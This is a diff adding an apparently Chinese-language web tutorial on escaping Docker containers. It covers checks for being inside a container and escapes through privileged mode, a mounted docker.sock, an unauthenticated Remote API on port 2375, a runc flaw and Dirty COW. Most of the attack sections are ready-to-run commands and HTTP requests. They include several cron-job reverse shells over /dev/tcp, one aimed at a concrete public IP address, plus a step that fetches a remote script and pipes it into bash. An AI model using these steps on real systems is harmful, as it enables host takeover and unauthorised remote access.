@@ -1,0 +1,189 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="52c3c7c908f25c030ca11308b02dcaa3">原理</h1>
+<p>docker其实就是一个linux下的进程，它通过NameSpace 等命令实现了内核级别环境隔离（文件、网络、资源），所以相比虚拟机而言，Docker 的隔离性要弱上不少 ，这就导致可以通过很多方法来进行docker逃逸。</p>
+<h1 data-content="1" id="593cbeb4e909dba7370f6ef6ec024477">环境搭建</h1>
+<div class="highlight"><pre><span></span>curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o docker.sh <span class="o">&amp;&amp;</span> bash docker.sh
+</pre></div>
+<h1 data-content="1" id="fe2e9c407d686365a3e8580c7e5778c6">Docker 环境判断</h1>
+<p>1、查找.dockerenv文件</p>
+<p>docker下默认存在dockerenv文件，而非docker环境中则没有</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211257-650918ce-e5c6-1.png"/><br/>
+2、查询cgroup进程</p>
+<div class="highlight"><pre><span></span>cat /proc/1/cgroup
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211307-6aacd004-e5c6-1.png"/><br/>
+3、查看容器环境变量</p>
+<div class="highlight"><pre><span></span>cat /proc/1/environ
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211313-6e22b15e-e5c6-1.png"/></p>
+<h1 data-content="1" id="7941a29629079585315f07d02ce19972">Docker 容器逃逸</h1>
+<h2 data-content="1" id="fd7503ffd53df71bac9f87cd28782ace">特权模式逃逸</h2>
+<p>以特权模式启动时，docker容器内拥有宿主机文件读写权限，可以通过写ssh密钥、计划任务等方式达到逃逸。</p>
+<h3 data-content="1" id="4dfc9307b9d1a03678a17aad4f55d9a6">如何判断是否为特权模式</h3>
+<p>在suid提权中SUID设置的程序出现漏洞就非常容易被利用，所以 Linux 引入了 Capability 机制以此来实现更加细致的权限控制，从而增加系统的安全性</p>
+<p>当容器为特权模式时，将添加如下功能：<a href="https://www.bookstack.cn/read/openeuler-21.03-zh/70e0731add42ae6d.md" target="_blank">使用指南 - 特权容器</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211322-73800322-e5c6-1.png"/><br/>
+但这里并不能说拥有以上某种功能就是特权容器，因为特权容器还需满足：</p>
+<ul>
+<li>必须缺少AppArmor配置文件，否则将允许mount syscall</li>
+<li>能够“看到”很多敏感的dev设备</li>
+</ul>
+<p>上述两个条件目前还不知道如何获取，所以重点看下特权容器中获取的 Cap 集合</p>
+<div class="highlight"><pre><span></span>root@227b7e10b9a6:/# cat /proc/1/status <span class="p">|</span> grep Cap
+CapInh: <span class="m">0000000000000000</span>
+CapPrm: 0000001fffffffff
+CapEff: 0000001fffffffff
+CapBnd: 0000001fffffffff
+CapAmb: <span class="m">0000000000000000</span>
+</pre></div>
+<p>CapEff 主要是检查线程的执行权限，所以重点看下利用 <code>capsh --decode=0000003fffffffff</code> 进行解码，检索默认没有添加的 NET_ADMIN，发现存在</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211332-79e01266-e5c6-1.png"/><br/>
+而非特权容器的 Cap 集合值并进行解码，发现并不存在 NET_ADMIN</p>
+<p>因此当执行 <code>cat /proc/1/status | grep Cap</code> 查询对应出来的值为 <code>0000003fffffffff</code> 那么就有可能是特权容器，可尝试逃逸</p>
+<h3 data-content="1" id="0cd393d2598f799e2a38fe56b2599438">逃逸</h3>
+<p>1、首先以特权模式运行一个docker容器</p>
+<div class="highlight"><pre><span></span>docker run -it --privileged 镜像id /bin/bash
+</pre></div>
+<p>2、查看磁盘文件</p>
+<pre><code>fdisk -l</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211343-80258066-e5c6-1.png"/><br/>
+3、新建一个目录,将/dev/vda1挂载至新建的目录</p>
+<div class="highlight"><pre><span></span>mkdir /test
+mount /dev/vda1 /test
+</pre></div>
+<p>4、写入计划任务到宿主机</p>
+<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s1">'* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1'</span> &gt;&gt; /test/var/spool/cron/root
+</pre></div>
+<p>5、成功反弹shell</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211403-8bf935ae-e5c6-1.png"/></p>
+<h2 data-content="1" id="f2dd948f313da76cb9c0ad1d49324135">docker.sock挂载逃逸</h2>
+<p>Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon(docker守护进程)扮演，二者之间通信方式有以下3种：</p>
+<pre><code>1、unix:///var/run/docker.sock
+2、tcp://host:port
+3、fd://socketfd</code></pre>
+<p>其中使用docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载/var/run/docker.sock文件。<br/>
+本质上而言，能够访问docker socket 或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。<br/>
+因此，当容器访问docker socket时，我们可通过与docker daemon的通信对其进行恶意操纵完成逃逸。若容器A可以访问docker socket，我们便可在其内部安装client（docker），通过docker.sock与宿主机的server（docker daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。</p>
+<h3 data-content="1" id="a8b45e81f7caa9dccbbf403833d09a9c">逃逸</h3>
+<p>1、运行一个挂载/var/run/的容器</p>
+<div class="highlight"><pre><span></span>docker run -it -v /var/run/:/host/var/run/ 5d2df19066ac /bin/bash
+</pre></div>
+<p>2、寻找下挂载的sock文件</p>
+<pre><code>find / -name docker.sock</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211419-95c4e2f4-e5c6-1.png"/><br/>
+3、在容器内安装client，即docker</p>
+<div class="highlight"><pre><span></span>apt-get update
+apt-get install docker.io
+</pre></div>
+<p>4、查看宿主机docker信息</p>
+<pre><code>docker -H unix:///host/var/run/docker.sock info</code></pre>
+<p>5、运行一个新容器并挂载宿主机根路径</p>
+<pre><code>docker -H unix:///host/var/run/docker.sock run -v /:/test -it ubuntu:14.04 /bin/bash</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211447-a65dcff4-e5c6-1.png"/><br/>
+6、写入计划任务到宿主机</p>
+<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s1">'* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1'</span> &gt;&gt; /test/var/spool/cron/root
+</pre></div>
+<h2 data-content="1" id="8fda0a367d060874953b1103e2dba305">Remote API未授权访问</h2>
+<p>docker swarm中默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。</p>
+<h3 data-content="1" id="fc1a70e62670816490ef3818d938338d">未授权访问</h3>
+<p>当使用官方推荐启动方式时</p>
+<pre><code>dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</code></pre>
+<p>在没有其他网络访问限制的主机上使用，则会在公网暴漏端口。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211433-9e1cbe5e-e5c6-1.png"/><br/>
+1、此时访问/containers/json，便会得到所有容器id字段</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211504-b0a412ac-e5c6-1.png"/><br/>
+2、创建一个 exec</p>
+<div class="highlight"><pre><span></span>POST /containers/&lt;container_id&gt;/exec HTTP/1.1
+Host: &lt;docker_host&gt;:PORT
+Content-Type: application/json
+Content-Length: <span class="m">188</span>
+
+<span class="o">{</span>
+  <span class="s2">"AttachStdin"</span>: true,
+  <span class="s2">"AttachStdout"</span>: true,
+  <span class="s2">"AttachStderr"</span>: true,
+  <span class="s2">"Cmd"</span>: <span class="o">[</span><span class="s2">"cat"</span>, <span class="s2">"/etc/passwd"</span><span class="o">]</span>,
+  <span class="s2">"DetachKeys"</span>: <span class="s2">"ctrl-p,ctrl-q"</span>,
+  <span class="s2">"Privileged"</span>: true,
+  <span class="s2">"Tty"</span>: <span class="nb">true</span>
+<span class="o">}</span>
+</pre></div>
+<p>发包后返回exec的id参数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211520-ba153a64-e5c6-1.png"/><br/>
+3、执行exec中的命令，成功读取passwd文件</p>
+<div class="highlight"><pre><span></span>POST /exec/&lt;exec_id&gt;/start HTTP/1.1
+Host: &lt;docker_host&gt;:PORT
+Content-Type: application/json
+
+<span class="o">{</span>
+ <span class="s2">"Detach"</span>: false,
+ <span class="s2">"Tty"</span>: <span class="nb">false</span>
+<span class="o">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211540-c5d2aa26-e5c6-1.png"/><br/>
+这种方式只是获取到了docker主机的命令执行权限，但是还无法逃逸到宿主机。因此还是需要写公钥或者计时任务进行逃逸</p>
+<h3 data-content="1" id="c3d00cd5a97a87171e7d72e2c04e6e35">逃逸</h3>
+<p>1、在容器内安装docker</p>
+<div class="highlight"><pre><span></span>apt-get update
+apt-get install docker.io
+</pre></div>
+<p>2、查看宿主机docker镜像信息</p>
+<pre><code>docker -H tcp://ip:2375 images</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211553-cd69175c-e5c6-1.png"/><br/>
+3、启动一个容器并将宿主机根目录挂在到容器的test目录</p>
+<pre><code>docker -H tcp://ip:2375 run -it -v /:/test 5d2df19066ac /bin/bash</code></pre>
+<p>4、计时任务反弹shell</p>
+<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s1">'* * * * * bash -i &gt;&amp; /dev/tcp/101.200.208.44/4000 0&gt;&amp;1'</span> &gt;&gt; /test/var/spool/cron/root
+</pre></div>
+<h2 data-content="1" id="f4cb249a2dc2b00738a40f20ecac531f">容器服务缺陷逃逸</h2>
+<p>runc是一个底层服务工具，runC 管理容器的创建，运行，销毁等，docker部分版本服务运行时底层其实在运行着runc服务，攻击者可以通过特定的容器镜像或者exec操作重写宿主机上的runc 二进制文件，并在宿主机上以root身份执行命令。</p>
+<h3 data-content="1" id="3a73e1688410e866a97a765c18387fc5">影响版本</h3>
+<p>docker version &lt;=18.09.2</p>
+<p>RunC version &lt;=1.0-rc6</p>
+<h3 data-content="1" id="0742b3a8f6729e1cb4e2df2d645c93e1">环境搭建</h3>
+<p>由于对版本有限制，所以用之前docker中的ubuntu环境搭建符合漏洞版本的docker，参考<a href="https://segmentfault.com/a/1190000042702027?utm_source=sf-similar-article" target="_blank">Ubuntu安装指定版本的docker - 朝花夕拾 - SegmentFault 思否</a></p>
+<p>1、安装 apt 依赖包，用于通过HTTPS来获取仓库</p>
+<pre><code>apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</code></pre>
+<p>2、添加 Docker 的官方 GPG 密钥</p>
+<div class="highlight"><pre><span></span><span class="nx">curl</span> <span class="o">-</span><span class="nx">fsSL</span> <span class="nx">https</span><span class="err">:</span><span class="o">/</span><span class="err">/download.docker.com/linux/ubuntu/gpg | apt-key add -</span>
+</pre></div>
+<p>3、设置稳定版仓库(添加到/etc/apt/sources.list中)</p>
+<div class="highlight"><pre><span></span>add-apt-repository <span class="s">"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</span>
+</pre></div>
+<p>4、更新apt-get</p>
+<pre><code>apt-get update</code></pre>
+<p>5、查询docker-ce版本</p>
+<div class="highlight"><pre><span></span><span class="err">apt-cache</span> <span class="err">policy</span> <span class="err">docker-ce</span>
+</pre></div>
+<p>6、安装指定版本docker</p>
+<div class="highlight"><pre><span></span>apt-get install docker-ce<span class="o">=</span><span class="m">18</span>.06.1~ce~3-0~ubuntu
+</pre></div>
+<h3 data-content="1" id="fe8c1cdfd95dbacb4b2422af54b419a8">逃逸</h3>
+<p>1、编译payload中反弹shell地址</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230428211611-d820b3c6-e5c6-1.png"/><br/>
+2、编译生成payload</p>
+<div class="highlight"><pre><span></span><span class="nv">CGO_ENABLED</span><span class="o">=</span><span class="m">0</span> <span class="nv">GOOS</span><span class="o">=</span>linux <span class="nv">GOARCH</span><span class="o">=</span>amd64 go build main.go
+</pre></div>
+<p>3、编译好后传入docker容器中</p>
+<div class="highlight"><pre><span></span>docker cp main 1fa6a736e332:/home
+docker <span class="nb">exec</span> -it 1fa6a736e332 /bin/bash
+<span class="nb">cd</span> /home/
+chmod <span class="m">777</span> main
+</pre></div>
+<p>4.运行main程序成功反弹shell</p>
+<div class="highlight"><pre><span></span>./main
+</pre></div>
+<h2 data-content="1" id="50914cd0f88b19819e4522c0eb48fd92">脏牛漏洞逃逸</h2>
+<p>Dirty Cow是Linux内核中的提权漏洞，源于Linux内核的内存子系统在处理写入拷贝时存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</p>
+<p>docker和宿主机共享内核，因此就可利用该漏洞进行逃逸</p>
+<div class="highlight"><pre><span></span><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="o">:</span><span class="c1">//github.com/gebl/dirtycow-docker-vdso.git</span>
+<span class="n">cd</span> <span class="n">dirtycow</span><span class="o">-</span><span class="n">docker</span><span class="o">-</span><span class="n">vdso</span><span class="o">/</span>
+<span class="n">docker</span><span class="o">-</span><span class="n">compose</span> <span class="n">run</span> <span class="n">dirtycow</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+
+<span class="n">cd</span> <span class="o">/</span><span class="n">dirtycow</span><span class="o">-</span><span class="n">vdso</span><span class="o">/</span>
+<span class="n">make</span>
+<span class="o">./</span><span class="mh">0xdeadbeef</span> <span class="n">ip</span><span class="o">:</span><span class="n">port</span> <span class="c1">// 反弹shell</span>
+</pre></div>
+</div>
+</div>
